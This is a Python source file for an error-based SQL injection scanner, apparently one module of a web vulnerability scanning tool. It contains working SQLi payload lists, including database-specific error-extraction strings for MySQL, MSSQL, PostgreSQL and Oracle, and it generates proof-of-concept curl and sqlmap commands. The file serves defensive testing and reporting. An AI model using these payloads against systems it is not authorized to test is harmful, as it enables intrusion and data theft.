"""
SQL Injection - Error Based Scanner
====================================

Detects SQL injection vulnerabilities by analyzing error messages
returned by the database when malformed SQL is injected.

Detection Flow:
1. Inject syntax-breaking payloads (quotes, special chars)
2. Analyze response for SQL error messages
3. Fingerprint database type from error patterns
4. Confirm with additional payloads

This is the easiest SQLi type to detect and exploit.
"""

import asyncio
import logging
import re
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs
import aiohttp

from .base import SQLiBase, SQLiResult, DatabaseType

logger = logging.getLogger(__name__)


class SQLiErrorBased(SQLiBase):
    """
    Scanner for Error-Based SQL Injection.
    
    Sub-type: error_based
    OWASP: A03:2021 - Injection
    CWE: CWE-89
    """
    
    SUB_TYPE = "error_based"
    TITLE_FORMAT = "SQL Injection (Error-Based) - {param}"
    
    # Error-inducing payloads
    ERROR_PAYLOADS = [
        "'",                    # Single quote
        "''",                   # Double single quote
        '"',                    # Double quote
        '`',                    # Backtick
        "' OR '",               # Unclosed OR
        "1'",                   # Number + quote
        "1\"",                  # Number + double quote
        "1' AND",               # Incomplete AND
        "1 AND SLEEP(0)--",     # MySQL specific
        "'; SELECT 1--",        # Statement termination
        "1; SELECT 1--",        # Stacked query attempt
        "' UNION SELECT 1--",   # UNION syntax
        "1' ORDER BY 100--",    # High column count
        "CAST(1 AS INT",        # Incomplete CAST
        "CONVERT(1,",           # Incomplete CONVERT
    ]
    
    # Database-specific error extraction payloads
    DB_SPECIFIC_PAYLOADS = {
        DatabaseType.MYSQL: [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION())))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION())),1)--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
        ],
        DatabaseType.MSSQL: [
            "' AND 1=CONVERT(INT,(SELECT @@VERSION))--",
            "' AND 1=CAST((SELECT @@VERSION) AS INT)--",
        ],
        DatabaseType.POSTGRESQL: [
            "' AND 1=CAST((SELECT VERSION()) AS INT)--",
            "'||(SELECT '')||'",
        ],
        DatabaseType.ORACLE: [
            "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT VERSION FROM V$INSTANCE))--",
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT VERSION FROM V$INSTANCE))--",
        ],
    }
    
    async def scan(self) -> List[SQLiResult]:
        """Run Error-Based SQLi scan"""
        logger.info(f"Starting Error-Based SQLi scan for {self.context.target_url}")
        
        urls_to_test = await self._get_test_urls()
        
        async with aiohttp.ClientSession() as session:
            for url, method in urls_to_test:
                await self._scan_url(session, url, method)
                await asyncio.sleep(1 / self.rate_limit)
        
        logger.info(f"Error-Based SQLi scan complete. Found {len(self.findings)} vulnerabilities")
        return self.findings
    
    async def _get_test_urls(self) -> List[tuple]:
        """Get URLs with parameters to test"""
        urls = []
        
        if '?' in self.context.target_url:
            urls.append((self.context.target_url, 'GET'))
        
        if hasattr(self.context, 'crawl_results'):
            for page in self.context.crawl_results:
                if '?' in page.get('url', ''):
                    urls.append((page['url'], page.get('method', 'GET')))
        
        if hasattr(self.context, 'request_store'):
            for req in self.context.request_store.get_all():
                if req.get('params'):
                    urls.append((req['url'], req.get('method', 'GET')))
        
        seen = set()
        unique = []
        for url, method in urls:
            key = f"{method}:{url}"
            if key not in seen and self._is_in_scope(url):
                seen.add(key)
                unique.append((url, method))
        
        return unique
    
    async def _scan_url(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str
    ) -> None:
        """Scan a single URL for error-based SQLi"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Get baseline
            baseline_status, baseline_body, _ = await self._get_baseline(session, url, method)
            
            for param in params.keys():
                result = await self._test_parameter(session, url, method, param, baseline_body)
                if result:
                    self.findings.append(result)
                    
        except Exception as e:
            logger.error(f"Error scanning {url}: {e}")
    
    async def _test_parameter(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        baseline_body: str
    ) -> Optional[SQLiResult]:
        """Test a parameter for error-based SQLi"""
        
        detected_db = DatabaseType.UNKNOWN
        best_evidence = None
        best_payload = None
        
        for payload in self.ERROR_PAYLOADS:
            try:
                test_url = self._inject_payload(url, param, payload)
                
                async with session.request(
                    method,
                    test_url,
                    headers=self.DEFAULT_HEADERS,
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    ssl=False
                ) as response:
                    body = await response.text()
                    status = response.status
                    resp_headers = dict(response.headers)
                    
                    # Check for SQL errors
                    has_error, error_msg = self._has_sql_error(body)
                    
                    if has_error:
                        # Verify not a false positive
                        if self._is_sql_injection_false_positive(baseline_body, body, error_msg):
                            continue
                        
                        # Fingerprint database
                        detected_db = self._detect_database(body)
                        best_evidence = error_msg
                        best_payload = payload
                        
                        # Build finding
                        return SQLiResult(
                            id=self._generate_finding_id("SQLI-ERROR"),
                            category="A03:2021 - Injection",
                            sub_type=self.SUB_TYPE,
                            severity="critical",
                            title=self.TITLE_FORMAT.format(param=param),
                            description=self._build_description(param, detected_db, error_msg),
                            url=url,
                            method=method,
                            parameter=param,
                            payload=payload,
                            evidence=f"SQL Error detected: {error_msg}",
                            poc=self._build_poc(url, param, payload, detected_db),
                            reasoning=self._build_reasoning(payload, error_msg, detected_db),
                            request_data=self._format_request(method, test_url, self.DEFAULT_HEADERS),
                            response_data=self._format_response(status, resp_headers, body),
                            confidence=0.90,
                            database_type=detected_db,
                            verification_status="verified",
                            cwe_id="CWE-89",
                            remediation=self._build_remediation(),
                        )
                        
            except Exception as e:
                logger.debug(f"Payload test error: {e}")
        
        return None
    
    def _build_description(self, param: str, db_type: DatabaseType, error_msg: str) -> str:
        """Build vulnerability description"""
        db_name = db_type.value.upper() if db_type != DatabaseType.UNKNOWN else "Unknown"
        
        return f"""A SQL Injection vulnerability was identified in the '{param}' parameter.

**Type:** Error-Based SQL Injection
**Database:** {db_name}

The application returns database error messages when malformed SQL syntax is injected. This allows an attacker to:

1. **Extract data** - Use error messages to leak database contents
2. **Enumerate schema** - Discover table and column names
3. **Bypass authentication** - Manipulate login queries
4. **Execute commands** - Potentially run OS commands (xp_cmdshell, etc.)

**Error Message Detected:**
```
{error_msg}
```

**Severity:** CRITICAL - SQL Injection can lead to complete database compromise.
"""
    
    def _build_poc(self, url: str, param: str, payload: str, db_type: DatabaseType) -> str:
        """Build Proof of Concept"""
        
        extraction_examples = {
            DatabaseType.MYSQL: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION())))--",
            DatabaseType.MSSQL: "' AND 1=CONVERT(INT,@@VERSION)--",
            DatabaseType.POSTGRESQL: "' AND CAST(VERSION() AS INT)=1--",
            DatabaseType.ORACLE: "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--",
        }
        
        extraction = extraction_examples.get(db_type, "' UNION SELECT NULL,VERSION()--")
        
        return f"""### Proof of Concept

**Vulnerable URL:**
```
{url}
```

**Vulnerable Parameter:** `{param}`

**Error-Inducing Payload:**
```
{payload}
```

**Data Extraction Example ({db_type.value}):**
```
{extraction}
```

**cURL Test:**
```bash
curl -s "{self._inject_payload(url, param, payload)}" | grep -i "error\\|sql\\|syntax"
```

**sqlmap Command:**
```bash
sqlmap -u "{url}" -p {param} --dbms={db_type.value} --batch
```
"""
    
    def _build_reasoning(self, payload: str, error_msg: str, db_type: DatabaseType) -> str:
        """Build verification reasoning"""
        return f"""✓ Injected payload: `{payload}`
✓ SQL error message returned in response
✓ Error pattern matches {db_type.value} database
✓ Error message: "{error_msg[:100]}..."
✓ This confirms the input is directly concatenated into SQL queries"""
